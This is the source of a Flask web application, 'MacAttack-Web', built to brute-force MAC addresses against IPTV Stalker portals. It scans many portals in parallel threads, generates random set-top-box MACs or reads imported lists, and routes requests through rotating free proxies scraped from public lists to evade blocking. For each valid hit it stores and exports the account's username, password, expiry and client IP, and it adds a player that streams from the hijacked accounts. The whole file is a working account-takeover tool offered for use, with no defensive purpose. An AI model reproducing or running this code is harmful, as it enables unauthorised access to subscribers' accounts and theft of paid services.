"""
MacAttack-Web - Web-based MAC Address Testing Tool for Stalker Portals
A Flask-based Linux/Docker version of MacAttack with Web UI
Features: Multi-Portal Scanning, Proxy Error Tracking, SOCKS Support
"""
import os
import json
import logging
import random
import time
import threading
import secrets
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager
from collections import defaultdict

from flask import Flask, render_template, request, jsonify, Response
import requests
import waitress

import stb

VERSION = "1.2.0"

# Logging setup
logger = logging.getLogger("MacAttack")
logger.setLevel(logging.INFO)
logFormat = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")

if os.getenv("CONFIG"):
    configFile = os.getenv("CONFIG")
    log_dir = os.path.dirname(configFile)
else:
    log_dir = "./data"
    configFile = os.path.join(log_dir, "macattack.json")

os.makedirs(log_dir, exist_ok=True)
os.makedirs("./logs", exist_ok=True)

log_file_path = os.path.join("./logs", "macattack.log")
fileHandler = logging.FileHandler(log_file_path)
fileHandler.setFormatter(logFormat)
logger.addHandler(fileHandler)

consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
logger.addHandler(consoleHandler)

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)

host = os.getenv("HOST", "0.0.0.0:5002")
logger.info(f"Server will start on http://{host}")

# Global state
config = {}

# Multi-portal attack states
attack_states = {}  # portal_id -> attack_state
attack_states_lock = threading.Lock()

# Proxy error tracking (like original MacAttack)
proxy_error_counts = defaultdict(int)  # proxy -> error count
proxy_error_connect_counts = defaultdict(int)  # proxy -> connection error count
MAX_PROXY_ERRORS = 5  # Remove proxy after this many errors

proxy_state = {
    "fetching": False,
    "testing": False,
    "proxies": [],
    "working_proxies": [],
    "logs": []
}

# Default settings
defaultSettings = {
    "speed": 10,
    "timeout": 10,
    "use_proxies": False,
    "proxy_rotation": True,
    "mac_prefix": "00:1A:79:",
    "output_format": "mac_only",
    "auto_save": True,
    "max_proxy_errors": 5,
}

# Default proxy sources
DEFAULT_PROXY_SOURCES = [
    "https://spys.me/proxy.txt",
    "https://free-proxy-list.net/",
    "https://www.us-proxy.org/",
    "https://www.sslproxies.org/",
]


def load_config():
    global config
    try:
        with open(configFile) as f:
            config = json.load(f)
        logger.info(f"Config loaded from {configFile}")
    except FileNotFoundError:
        logger.warning("No config found, creating default")
        config = {}
    except Exception as e:
        logger.error(f"Error loading config: {e}")
        config = {}
    
    config.setdefault("settings", {})
    config.setdefault("found_macs", [])
    config.setdefault("proxies", [])
    config.setdefault("portals", [])
    config.setdefault("mac_list", [])
    config.setdefault("proxy_sources", DEFAULT_PROXY_SOURCES.copy())
    
    for key, default in defaultSettings.items():
        config["settings"].setdefault(key, default)
    
    save_config()
    return config


def save_config():
    try:
        with open(configFile, "w") as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving config: {e}")


def get_settings():
    if not config:
        load_config()
    return config.get("settings", defaultSettings)


def generate_mac(prefix="00:1A:79:"):
    suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
    return f"{prefix}{suffix}"


def add_log(state, message, level="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    state["logs"].append({"time": timestamp, "level": level, "message": message})
    if len(state["logs"]) > 500:
        state["logs"] = state["logs"][-500:]


def get_working_proxy():
    """Get a working proxy, respecting error counts like original MacAttack."""
    global proxy_error_counts
    proxies = config.get("proxies", [])
    if not proxies:
        return None
    
    max_errors = get_settings().get("max_proxy_errors", MAX_PROXY_ERRORS)
    
    # Filter out proxies with too many errors
    working = [p for p in proxies if proxy_error_counts[p] < max_errors]
    
    if not working:
        # Reset error counts if all proxies are exhausted
        proxy_error_counts.clear()
        working = proxies
    
    return random.choice(working) if working else None


def mark_proxy_error(proxy, is_connection_error=False):
    """Mark a proxy as having an error - like original MacAttack."""
    global proxy_error_counts, proxy_error_connect_counts
    if proxy:
        proxy_error_counts[proxy] += 1
        if is_connection_error:
            proxy_error_connect_counts[proxy] += 1


@contextmanager
def no_proxy_environment():
    original_http = os.environ.get("http_proxy")
    original_https = os.environ.get("https_proxy")
    try:
        if "http_proxy" in os.environ:
            del os.environ["http_proxy"]
        if "https_proxy" in os.environ:
            del os.environ["https_proxy"]
        yield
    finally:
        if original_http:
            os.environ["http_proxy"] = original_http
        if original_https:
            os.environ["https_proxy"] = original_https


# ============== ROUTES ==============

@app.route("/")
def index():
    return render_template("index.html", version=VERSION)


@app.route("/api/settings", methods=["GET", "POST"])
def api_settings():
    if request.method == "GET":
        return jsonify(get_settings())
    
    data = request.json
    settings = get_settings()
    for key in data:
        if key in settings:
            settings[key] = data[key]
    config["settings"] = settings
    save_config()
    return jsonify({"success": True, "settings": settings})


# ============== PORTALS MANAGEMENT ==============

@app.route("/api/portals", methods=["GET", "POST"])
def api_portals():
    if request.method == "GET":
        return jsonify(config.get("portals", []))
    
    data = request.json
    portal = {
        "id": secrets.token_hex(8),
        "name": data.get("name", "").strip(),
        "url": data.get("url", "").strip(),
        "enabled": data.get("enabled", True),
        "created_at": datetime.now().isoformat()
    }
    
    if portal["url"] and not portal["url"].startswith("http"):
        portal["url"] = f"http://{portal['url']}"
    if not portal["name"]:
        portal["name"] = portal["url"]
    
    config["portals"].append(portal)
    save_config()
    return jsonify({"success": True, "portal": portal})


@app.route("/api/portals/<portal_id>", methods=["PUT", "DELETE"])
def api_portal_manage(portal_id):
    portals = config.get("portals", [])
    
    if request.method == "DELETE":
        config["portals"] = [p for p in portals if p.get("id") != portal_id]
        save_config()
        return jsonify({"success": True})
    
    if request.method == "PUT":
        data = request.json
        for portal in portals:
            if portal.get("id") == portal_id:
                portal["name"] = data.get("name", portal["name"])
                portal["url"] = data.get("url", portal["url"])
                portal["enabled"] = data.get("enabled", portal["enabled"])
                break
        save_config()
        return jsonify({"success": True})


# ============== MAC LIST MANAGEMENT ==============

@app.route("/api/maclist", methods=["GET", "POST", "DELETE"])
def api_maclist():
    if request.method == "GET":
        return jsonify({"macs": config.get("mac_list", []), "count": len(config.get("mac_list", []))})
    
    if request.method == "POST":
        data = request.json
        macs_text = data.get("macs", "")
        macs = []
        for line in macs_text.strip().split("\n"):
            mac = line.strip().upper()
            if mac and len(mac) >= 11:
                mac = mac.replace("-", ":").replace(".", ":")
                if mac not in macs:
                    macs.append(mac)
        config["mac_list"] = macs
        save_config()
        return jsonify({"success": True, "count": len(macs)})
    
    if request.method == "DELETE":
        config["mac_list"] = []
        save_config()
        return jsonify({"success": True})


@app.route("/api/maclist/import", methods=["POST"])
def api_maclist_import():
    if "file" not in request.files:
        return jsonify({"success": False, "error": "No file uploaded"})
    
    file = request.files["file"]
    content = file.read().decode("utf-8", errors="ignore")
    
    macs = []
    for line in content.strip().split("\n"):
        mac = line.strip().upper()
        if mac and len(mac) >= 11:
            mac = mac.replace("-", ":").replace(".", ":")
            if mac not in macs:
                macs.append(mac)
    
    config["mac_list"] = macs
    save_config()
    return jsonify({"success": True, "count": len(macs)})


# ============== MULTI-PORTAL ATTACK ==============

def create_attack_state(portal_id, portal_url, mode="random"):
    """Create a new attack state for a portal."""
    return {
        "id": portal_id,
        "running": True,
        "paused": False,
        "tested": 0,
        "hits": 0,
        "errors": 0,
        "current_mac": "",
        "current_proxy": "",
        "found_macs": [],
        "logs": [],
        "start_time": time.time(),
        "portal_url": portal_url,
        "mode": mode,
        "mac_list_index": 0,
        "mac_list_total": len(config.get("mac_list", [])) if mode == "list" else 0
    }


@app.route("/api/attack/start", methods=["POST"])
def api_attack_start():
    """Start attack on one or multiple portals."""
    data = request.json
    portal_urls = data.get("urls", [])  # List of URLs for multi-portal
    single_url = data.get("url", "").strip()  # Single URL (backward compatible)
    mode = data.get("mode", "random")
    
    # Handle single URL
    if single_url and not portal_urls:
        portal_urls = [single_url]
    
    if not portal_urls:
        return jsonify({"success": False, "error": "Portal URL(s) required"})
    
    if mode == "list" and not config.get("mac_list"):
        return jsonify({"success": False, "error": "MAC list is empty"})
    
    started = []
    for url in portal_urls:
        if not url.startswith("http"):
            url = f"http://{url}"
        
        # Auto-detect portal endpoint if user only provided base URL
        detected_url, portal_type, version = stb.auto_detect_portal_url(url)
        if detected_url:
            url = detected_url
            logger.info(f"Auto-detected portal: {url} (type: {portal_type}, version: {version})")
        
        portal_id = secrets.token_hex(4)
        
        with attack_states_lock:
            attack_states[portal_id] = create_attack_state(portal_id, url, mode)
        
        add_log(attack_states[portal_id], f"Starting attack on {url}", "info")
        
        thread = threading.Thread(target=run_attack, args=(portal_id,), daemon=True)
        thread.start()
        
        started.append({"id": portal_id, "url": url})
    
    return jsonify({"success": True, "attacks": started})


@app.route("/api/attack/stop", methods=["POST"])
def api_attack_stop():
    """Stop attack(s)."""
    data = request.json
    portal_id = data.get("id")  # Specific portal or None for all
    
    with attack_states_lock:
        if portal_id:
            if portal_id in attack_states:
                attack_states[portal_id]["running"] = False
                add_log(attack_states[portal_id], "Attack stopped", "warning")
        else:
            for state in attack_states.values():
                state["running"] = False
                add_log(state, "Attack stopped", "warning")
    
    return jsonify({"success": True})


@app.route("/api/attack/pause", methods=["POST"])
def api_attack_pause():
    data = request.json
    portal_id = data.get("id")
    
    with attack_states_lock:
        if portal_id and portal_id in attack_states:
            attack_states[portal_id]["paused"] = not attack_states[portal_id]["paused"]
            status = "paused" if attack_states[portal_id]["paused"] else "resumed"
            add_log(attack_states[portal_id], f"Attack {status}", "info")
            return jsonify({"success": True, "paused": attack_states[portal_id]["paused"]})
    
    return jsonify({"success": False})


@app.route("/api/attack/status")
def api_attack_status():
    """Get status of all running attacks."""
    portal_id = request.args.get("id")
    
    with attack_states_lock:
        if portal_id:
            state = attack_states.get(portal_id, {})
            if state:
                elapsed = int(time.time() - state.get("start_time", time.time()))
                return jsonify({
                    "id": portal_id,
                    "running": state.get("running", False),
                    "paused": state.get("paused", False),
                    "tested": state.get("tested", 0),
                    "hits": state.get("hits", 0),
                    "errors": state.get("errors", 0),
                    "current_mac": state.get("current_mac", ""),
                    "current_proxy": state.get("current_proxy", ""),
                    "found_macs": state.get("found_macs", [])[-50:],
                    "logs": state.get("logs", [])[-100:],
                    "elapsed": elapsed,
                    "mode": state.get("mode", "random"),
                    "mac_list_index": state.get("mac_list_index", 0),
                    "mac_list_total": state.get("mac_list_total", 0),
                    "portal_url": state.get("portal_url", "")
                })
        
        # Return all attacks
        all_attacks = []
        for pid, state in attack_states.items():
            elapsed = int(time.time() - state.get("start_time", time.time()))
            all_attacks.append({
                "id": pid,
                "running": state.get("running", False),
                "paused": state.get("paused", False),
                "tested": state.get("tested", 0),
                "hits": state.get("hits", 0),
                "errors": state.get("errors", 0),
                "current_mac": state.get("current_mac", ""),
                "current_proxy": state.get("current_proxy", ""),
                "found_macs": state.get("found_macs", [])[-20:],
                "logs": state.get("logs", [])[-50:],
                "elapsed": elapsed,
                "portal_url": state.get("portal_url", "")
            })
        
        return jsonify({"attacks": all_attacks})


@app.route("/api/attack/clear", methods=["POST"])
def api_attack_clear():
    """Clear finished attacks from list."""
    with attack_states_lock:
        finished = [pid for pid, state in attack_states.items() if not state.get("running")]
        for pid in finished:
            del attack_states[pid]
    return jsonify({"success": True, "cleared": len(finished)})


def run_attack(portal_id):
    """Run the MAC attack for a specific portal."""
    global proxy_error_counts
    
    with attack_states_lock:
        if portal_id not in attack_states:
            return
        state = attack_states[portal_id]
    
    portal_url = state["portal_url"]
    settings = get_settings()
    speed = settings.get("speed", 10)
    timeout = settings.get("timeout", 10)
    use_proxies = settings.get("use_proxies", False)
    mac_prefix = settings.get("mac_prefix", "00:1A:79:")
    mode = state.get("mode", "random")
    max_proxy_errors = settings.get("max_proxy_errors", MAX_PROXY_ERRORS)
    
    proxies = config.get("proxies", []) if use_proxies else []
    proxy_index = 0
    mac_list = config.get("mac_list", []) if mode == "list" else []
    mac_list_index = 0
    
    # Log mode and MAC list info
    add_log(state, f"Attack started with {speed} threads, mode: {mode}", "info")
    if mode == "list":
        add_log(state, f"MAC list has {len(mac_list)} entries", "info")
        state["mac_list_total"] = len(mac_list)
        if len(mac_list) == 0:
            add_log(state, "WARNING: MAC list is empty!", "warning")
            state["running"] = False
            return
    else:
        add_log(state, f"Using random MACs with prefix: {mac_prefix}", "info")
    
    if use_proxies and proxies:
        add_log(state, f"Using {len(proxies)} proxies with rotation", "info")
    elif use_proxies and not proxies:
        add_log(state, "WARNING: Use Proxies enabled but no proxies loaded!", "warning")
    
    with ThreadPoolExecutor(max_workers=speed) as executor:
        futures = {}
        
        while state["running"]:
            while state["paused"] and state["running"]:
                time.sleep(0.5)
            
            if not state["running"]:
                break
            
            if mode == "list" and mac_list_index >= len(mac_list):
                add_log(state, f"MAC list exhausted ({mac_list_index} tested). Attack complete.", "success")
                break
            
            while len(futures) < speed and state["running"]:
                if mode == "list":
                    if mac_list_index >= len(mac_list):
                        break
                    mac = mac_list[mac_list_index]
                    mac_list_index += 1
                    state["mac_list_index"] = mac_list_index
                else:
                    mac = generate_mac(mac_prefix)
                
                proxy = None
                if proxies:
                    working_proxies = [p for p in proxies if proxy_error_counts[p] < max_proxy_errors]
                    if not working_proxies:
                        proxy_error_counts.clear()
                        working_proxies = proxies
                    proxy = working_proxies[proxy_index % len(working_proxies)]
                    proxy_index += 1
                    state["current_proxy"] = proxy
                
                # Log that we're testing this MAC
                proxy_info = f" via {proxy}" if proxy else ""
                add_log(state, f"Testing {mac}{proxy_info}", "info")
                
                future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
                futures[future] = (mac, proxy)
            
            done_futures = [f for f in futures if f.done()]
            
            for future in done_futures:
                mac, proxy = futures.pop(future)
                try:
                    success, result = future.result()
                    state["tested"] += 1
                    state["current_mac"] = mac
                    
                    proxy_info = f" via {proxy}" if proxy else ""
                    
                    if success:
                        state["hits"] += 1
                        
                        expiry = result.get("expiry", "Unknown")
                        channels = result.get("channels", 0)
                        genres = result.get("genres", [])
                        
                        state["found_macs"].append({
                            "mac": mac,
                            "expiry": expiry,
                            "channels": channels,
                            "time": datetime.now().strftime("%H:%M:%S")
                        })
                        
                        add_log(state, f"🎯 HIT! {mac} - Expiry: {expiry} - Channels: {channels}{proxy_info}", "success")
                        
                        # Save to persistent storage
                        found_entry = {
                            "mac": mac,
                            "expiry": expiry,
                            "portal": portal_url,
                            "channels": channels,
                            "genres": genres,
                            "vod_categories": result.get("vod_categories", []),
                            "series_categories": result.get("series_categories", []),
                            "backend_url": result.get("backend_url"),
                            "username": result.get("username"),
                            "password": result.get("password"),
                            "max_connections": result.get("max_connections"),
                            "created_at": result.get("created_at"),
                            "client_ip": result.get("client_ip"),
                            "found_at": datetime.now().isoformat()
                        }
                        config["found_macs"].append(found_entry)
                        logger.info(f"Saved found MAC to config: {mac}")
                        
                        if settings.get("auto_save", True):
                            save_config()
                            logger.info(f"Config saved with {len(config['found_macs'])} found MACs")
                    else:
                        add_log(state, f"✗ {mac} - No valid account{proxy_info}", "info")
                    
                except Exception as e:
                    state["tested"] += 1
                    state["errors"] += 1
                    error_msg = str(e).lower()
                    proxy_info = f" via {proxy}" if proxy else ""
                    if "timeout" in error_msg or "connection" in error_msg or "proxy" in error_msg:
                        mark_proxy_error(proxy, is_connection_error=True)
                        add_log(state, f"⚠ Proxy error: {mac}{proxy_info} - {str(e)[:30]}", "warning")
                    else:
                        add_log(state, f"✗ Error: {mac} - {str(e)[:50]}", "error")
            
            time.sleep(0.05)
    
    state["running"] = False
    add_log(state, f"✓ Finished. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")


def test_mac_worker(portal_url, mac, proxy, timeout):
    """Use full MAC test like original MacAttack."""
    return stb.test_mac_full(portal_url, mac, proxy, timeout)


# ============== PROXY ROUTES WITH CUSTOM SOURCES ==============

@app.route("/api/proxies", methods=["GET", "POST", "DELETE"])
def api_proxies():
    if request.method == "GET":
        return jsonify({
            "proxies": config.get("proxies", []),
            "state": proxy_state,
            "error_counts": dict(proxy_error_counts)
        })
    
    if request.method == "POST":
        data = request.json
        proxies = data.get("proxies", "").strip().split("\n")
        proxies = [p.strip() for p in proxies if p.strip()]
        # Remove duplicates while preserving order
        seen = set()
        unique_proxies = []
        for p in proxies:
            if p not in seen:
                seen.add(p)
                unique_proxies.append(p)
        config["proxies"] = unique_proxies
        save_config()
        return jsonify({"success": True, "count": len(unique_proxies)})
    
    if request.method == "DELETE":
        config["proxies"] = []
        proxy_error_counts.clear()
        save_config()
        return jsonify({"success": True})


@app.route("/api/proxies/sources", methods=["GET", "POST"])
def api_proxy_sources():
    """Manage custom proxy sources."""
    if request.method == "GET":
        return jsonify({"sources": config.get("proxy_sources", DEFAULT_PROXY_SOURCES)})
    
    if request.method == "POST":
        data = request.json
        sources = data.get("sources", [])
        if isinstance(sources, str):
            sources = [s.strip() for s in sources.split("\n") if s.strip()]
        config["proxy_sources"] = sources
        save_config()
        return jsonify({"success": True, "count": len(sources)})


@app.route("/api/proxies/fetch", methods=["POST"])
def api_proxies_fetch():
    global proxy_state
    
    if proxy_state["fetching"]:
        return jsonify({"success": False, "error": "Already fetching"})
    
    proxy_state["fetching"] = True
    proxy_state["logs"] = []
    
    thread = threading.Thread(target=fetch_proxies_worker, daemon=True)
    thread.start()
    
    return jsonify({"success": True})


@app.route("/api/proxies/test", methods=["POST"])
def api_proxies_test():
    global proxy_state
    
    if proxy_state["testing"]:
        return jsonify({"success": False, "error": "Already testing"})
    
    proxy_state["testing"] = True
    proxy_state["logs"] = []
    
    thread = threading.Thread(target=test_proxies_worker, daemon=True)
    thread.start()
    
    return jsonify({"success": True})


@app.route("/api/proxies/status")
def api_proxies_status():
    return jsonify(proxy_state)


@app.route("/api/proxies/reset-errors", methods=["POST"])
def api_proxies_reset_errors():
    """Reset proxy error counts."""
    global proxy_error_counts, proxy_error_connect_counts
    proxy_error_counts.clear()
    proxy_error_connect_counts.clear()
    return jsonify({"success": True})


def fetch_proxies_worker():
    """Fetch proxies from all sources including custom ones."""
    global proxy_state
    
    sources = config.get("proxy_sources", DEFAULT_PROXY_SOURCES)
    all_proxies = []
    
    for source in sources:
        try:
            add_log(proxy_state, f"Fetching from {source}", "info")
            with no_proxy_environment():
                response = requests.get(source, timeout=15)
                
                if "spys.me" in source:
                    matches = re.findall(r"[0-9]+(?:\.[0-9]+){3}:[0-9]+", response.text)
                    all_proxies.extend(matches)
                elif "freeproxy.world" in source:
                    matches = re.findall(
                        r'<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*</td>\s*'
                        r'<td>\s*<a href=".*?">(\d+)</a>\s*</td>',
                        response.text
                    )
                    all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                else:
                    # Generic parsing for most proxy list sites
                    matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", response.text)
                    if matches:
                        all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                    else:
                        # Try plain text format
                        matches = re.findall(r"[0-9]+(?:\.[0-9]+){3}:[0-9]+", response.text)
                        all_proxies.extend(matches)
                
                add_log(proxy_state, f"Found proxies from {source}", "info")
        except Exception as e:
            add_log(proxy_state, f"Error fetching from {source}: {e}", "error")
    
    all_proxies = list(set(all_proxies))
    proxy_state["proxies"] = all_proxies
    
    add_log(proxy_state, f"Total unique proxies: {len(all_proxies)}", "success")
    proxy_state["fetching"] = False


def test_proxies_worker():
    """Test proxies for validity - supports HTTP, SOCKS4, SOCKS5."""
    global proxy_state
    
    proxies = config.get("proxies", [])
    if not proxies:
        proxies = proxy_state.get("proxies", [])
    
    if not proxies:
        add_log(proxy_state, "No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    working = []
    add_log(proxy_state, f"Testing {len(proxies)} proxies...", "info")
    
    def test_proxy(proxy):
        try:
            with no_proxy_environment():
                proxy_dict = stb.parse_proxy(proxy)
                response = requests.get(
                    "http://httpbin.org/ip",
                    proxies=proxy_dict,
                    timeout=10
                )
                if response.status_code == 200:
                    return proxy, True
        except:
            pass
        return proxy, False
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(test_proxy, p): p for p in proxies}
        
        for future in as_completed(futures):
            proxy, is_working = future.result()
            if is_working:
                working.append(proxy)
                add_log(proxy_state, f"✓ {proxy}", "success")
            else:
                add_log(proxy_state, f"✗ {proxy}", "error")
    
    proxy_state["working_proxies"] = working
    config["proxies"] = working
    proxy_error_counts.clear()
    save_config()
    
    add_log(proxy_state, f"Done! {len(working)}/{len(proxies)} working", "success")
    proxy_state["testing"] = False


# ============== PLAYER ROUTES ==============

@app.route("/api/player/connect", methods=["POST"])
def api_player_connect():
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    proxy = data.get("proxy", "").strip() or None
    
    if not url or not mac:
        return jsonify({"success": False, "error": "URL and MAC required"})
    
    if not url.startswith("http"):
        url = f"http://{url}"
    
    try:
        token, token_random, portal_type, portal_version = stb.get_token(url, mac, proxy)
        
        if not token:
            return jsonify({"success": False, "error": "Failed to get token"})
        
        genres = stb.get_genres(url, mac, token, portal_type, token_random, proxy)
        vod_cats = stb.get_vod_categories(url, mac, token, portal_type, token_random, proxy)
        series_cats = stb.get_series_categories(url, mac, token, portal_type, token_random, proxy)
        
        return jsonify({
            "success": True,
            "token": token,
            "token_random": token_random,
            "portal_type": portal_type,
            "live": [{"id": g["id"], "name": g["title"]} for g in genres],
            "vod": [{"id": c["id"], "name": c["title"]} for c in vod_cats],
            "series": [{"id": c["id"], "name": c["title"]} for c in series_cats]
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/player/channels", methods=["POST"])
def api_player_channels():
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    token = data.get("token", "")
    token_random = data.get("token_random")
    portal_type = data.get("portal_type", "portal.php")
    category_type = data.get("category_type", "IPTV")
    category_id = data.get("category_id", "")
    proxy = data.get("proxy", "").strip() or None
    
    try:
        channels, total = stb.get_channels(url, mac, token, portal_type, category_type, category_id, token_random, proxy)
        return jsonify({"success": True, "channels": channels, "total": total})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/player/stream", methods=["POST"])
def api_player_stream():
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    token = data.get("token", "")
    token_random = data.get("token_random")
    portal_type = data.get("portal_type", "portal.php")
    cmd = data.get("cmd", "")
    content_type = data.get("content_type", "live")
    proxy = data.get("proxy", "").strip() or None
    
    try:
        if content_type == "vod":
            stream_url = stb.get_vod_stream_url(url, mac, token, portal_type, cmd, token_random, proxy)
        else:
            stream_url = stb.get_stream_url(url, mac, token, portal_type, cmd, token_random, proxy)
        
        if stream_url:
            return jsonify({"success": True, "stream_url": stream_url})
        else:
            return jsonify({"success": False, "error": "Failed to get stream URL"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# ============== FOUND MACS ==============

@app.route("/api/found", methods=["GET", "DELETE"])
def api_found():
    if request.method == "GET":
        return jsonify(config.get("found_macs", []))
    
    if request.method == "DELETE":
        config["found_macs"] = []
        save_config()
        return jsonify({"success": True})


@app.route("/api/found/export")
def api_found_export():
    """Export found MACs - like original MacAttack output format."""
    format_type = request.args.get("format", "txt")
    found = config.get("found_macs", [])
    
    if format_type == "json":
        return Response(
            json.dumps(found, indent=2),
            mimetype="application/json",
            headers={"Content-Disposition": "attachment;filename=found_macs.json"}
        )
    else:
        # Format like original MacAttack
        lines = []
        for m in found:
            line = f"{'Portal:':<10} {m.get('portal', 'N/A')}\n"
            line += f"{'MAC:':<10} {m['mac']}\n"
            
            if m.get('username') and m.get('password'):
                line += f"{'Username:':<10} {m.get('username')}\n"
                line += f"{'Password:':<10} {m.get('password')}\n"
            
            if m.get('max_connections'):
                line += f"{'Max Conn:':<10} {m.get('max_connections')}\n"
            
            line += f"{'Found on:':<10} {m.get('found_at', 'N/A')}\n"
            
            if m.get('created_at'):
                line += f"{'Creation:':<10} {m.get('created_at')}\n"
            
            line += f"{'Exp date:':<10} {m.get('expiry', 'N/A')}\n"
            line += f"{'Channels:':<10} {m.get('channels', 0)}\n"
            
            if m.get('genres'):
                line += f"{'Playlist:':<10} {', '.join(m.get('genres', []))}\n"
            
            if m.get('vod_categories'):
                line += f"{'VOD list:':<10} {', '.join(m.get('vod_categories', []))}\n"
            
            line += "\n" + "="*50 + "\n"
            lines.append(line)
        
        return Response(
            "\n".join(lines),
            mimetype="text/plain",
            headers={"Content-Disposition": "attachment;filename=found_macs.txt"}
        )


# ============== MAIN ==============

if __name__ == "__main__":
    load_config()
    logger.info(f"MacAttack-Web v{VERSION} starting...")
    
    host_parts = host.split(":")
    bind_host = host_parts[0]
    bind_port = int(host_parts[1]) if len(host_parts) > 1 else 5002
    
    logger.info(f"Server running on http://{bind_host}:{bind_port}")
    waitress.serve(app, host=bind_host, port=bind_port)
